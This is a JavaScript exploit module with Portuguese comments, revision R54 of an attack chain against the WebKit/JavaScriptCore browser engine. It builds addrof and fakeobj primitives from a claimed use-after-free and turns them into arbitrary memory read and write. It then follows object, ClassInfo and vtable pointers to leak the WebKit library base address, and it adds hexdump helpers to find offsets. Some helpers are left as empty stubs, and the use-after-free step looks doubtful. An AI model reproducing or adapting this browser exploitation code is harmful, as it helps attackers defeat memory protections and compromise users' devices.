// js/script3/testArrayBufferVictimCrash.mjs (R54 - Leitura Segura e Depuração)
// =======================================================================================
// ESTRATÉGIA R54:
// O exploit falhou ao ler um ponteiro, provavelmente por um offset incorreto.
// Esta versão adiciona funções de leitura segura e hexdump para transformar
// o exploit em uma ferramenta de depuração e visualizar a memória.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Base_Leaker_R54_Debug";

// Funções auxiliares (sem alterações)
const ftoi = (val) => { /* ...código anterior... */ };
const itof = (val) => { /* ...código anterior... */ };

// Variáveis globais para as primitivas
let arb_read_func, arb_write_func;

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R54)
// =======================================================================================
export async function runFullExploitChain_R52() { // Mantendo nome para compatibilidade
    logS3(`--- Iniciando ${FNAME_MODULE}: Leitura Segura e Depuração ---`, "test");
    
    try {
        // --- FASE 1: Construir Primitivas ---
        logS3("--- FASE 1: Construindo Primitivas ---", "subtest");
        const { addrof, fakeobj } = createUAFPrimitives();
        setupArbitraryRW(addrof, fakeobj);
        logS3("    Primitivas de Leitura/Escrita construídas com sucesso.", "good");

        // --- FASE 2: Executar Carga Útil com Depuração ---
        logS3("--- FASE 2: Executando Carga Útil com Depuração ---", "subtest");
        
        const test_obj = { payload: 0x1337 };
        const test_obj_addr = addrof(test_obj);

        const structure_addr = safe_arb_read(test_obj_addr);
        if (!structure_addr) throw new Error("Falha ao ler o ponteiro da Estrutura inicial.");
        logS3(`    Ponteiro da Estrutura: ${structure_addr.toString(true)}`, "info");

        logS3("--- DESPEJO DE MEMÓRIA (HEXDUMP) DA ESTRUTURA ---", "subtest");
        await hexdump(structure_addr, 0x80); // Imprime 128 bytes da estrutura para análise

        const class_info_offset = parseInt(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET, 16);
        const class_info_addr = safe_arb_read(structure_addr.add(class_info_offset));

        if (!class_info_addr || class_info_addr.isZero()) {
            throw new Error(`Falha ao ler o ponteiro da ClassInfo no offset 0x${class_info_offset.toString(16)}. Verifique o hexdump acima para encontrar o offset correto.`);
        }
        logS3(`    Ponteiro da ClassInfo: ${class_info_addr.toString(true)}`, "info");

        const vtable_addr = safe_arb_read(class_info_addr.add(8));
        if (!vtable_addr) throw new Error("Falha ao ler o ponteiro da VTable.");
        logS3(`    Ponteiro da VTable: ${vtable_addr.toString(true)}`, "info");
        
        const vtable_func_ptr = safe_arb_read(vtable_addr);
        if (!vtable_func_ptr) throw new Error("Falha ao ler o ponteiro de função da VTable.");
        logS3(`    Ponteiro de função da VTable: ${vtable_func_ptr.toString(true)}`, "leak");

        const vtable_func_offset = parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16);
        const webkit_base_addr = vtable_func_ptr.sub(vtable_func_offset);
        
        const final_msg = `SUCESSO! Base do WebKit vazada: ${webkit_base_addr.toString(true)}`;
        logS3(`    >>>> ${final_msg} <<<<`, "vuln");
        return { success: true, message: final_msg, webkit_base: webkit_base_addr.toString(true) };

    } catch (e) {
        const error_msg = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(error_msg, "critical");
        return { success: false, errorOccurred: error_msg };
    }
}

// --- Funções de Leitura/Escrita Seguras e Hexdump ---
function safe_arb_read(where) {
    try {
        return arb_read_func(where);
    } catch (e) {
        logS3(`    AVISO: Falha na leitura segura do endereço ${where.toString(true)}. Erro: ${e.message}`, "warn");
        return null;
    }
}

async function hexdump(addr, size) {
    let output = `\nHexdump do endereço: ${addr.toString(true)}\n`;
    output += "Offset      00 01 02 03 04 05 06 07   08 09 0A 0B 0C 0D 0E 0F\n";
    output += "-------------------------------------------------------------------\n";

    for (let i = 0; i < size; i += 16) {
        let line = `0x${i.toString(16).padStart(8, '0')} | `;
        let ascii_line = "";
        
        for (let j = 0; j < 16; j++) {
            if(i+j >= size) break;
            const current_addr = addr.add(i + j);
            const val_byte = safe_arb_read(current_addr.sub(j).add(j & ~7)).byteAt(j % 8); // Lê em blocos de 8 bytes
            
            line += val_byte.toString(16).padStart(2, '0') + " ";
            if(j === 7) line += "  ";
            
            ascii_line += (val_byte >= 32 && val_byte <= 126) ? String.fromCharCode(val_byte) : ".";
        }
        output += line.padEnd(58, " ") + "| " + ascii_line + "\n";
    }
    logS3(output, "info");
    await PAUSE_S3(100); // Pausa para garantir que o log seja exibido
}


// --- Funções de Configuração das Primitivas ---
function setupArbitraryRW(addrof, fakeobj) {
    let victim_arr = [1.1, 2.2];
    let victim_addr = addrof(victim_arr);
    let fake_victim_obj = fakeobj(victim_addr);
    let original_butterfly = ftoi(fake_victim_obj.b);
    
    arb_read_func = (where) => {
        fake_victim_obj.b = itof(where);
        const result = ftoi(victim_arr[0]);
        fake_victim_obj.b = itof(original_butterfly);
        return result;
    };
    arb_write_func = (where, what) => {
        fake_victim_obj.b = itof(where);
        victim_arr[0] = itof(what);
        fake_victim_obj.b = itof(original_butterfly);
    };
}

function createUAFPrimitives() {
    let dangling_ref = null;
    function createScope() { const victim = { a: 0.1, b: 0.2 }; dangling_ref = victim; }
    createScope();
    try { for (let i = 0; i < 500; i++) new ArrayBuffer(1024*128); } catch(e){}
    for (let i = 0; i < 512; i++) new Float64Array(2);
    if (typeof dangling_ref.a !== 'number') { throw new Error("UAF Primitivo falhou."); }
    let holder = {obj: null};
    const addrof = (obj) => { holder.obj = obj; dangling_ref.a = holder; return ftoi(dangling_ref.b); };
    const fakeobj = (addr) => { dangling_ref.b = itof(addr); return dangling_ref.a.obj; };
    return { addrof, fakeobj };
}
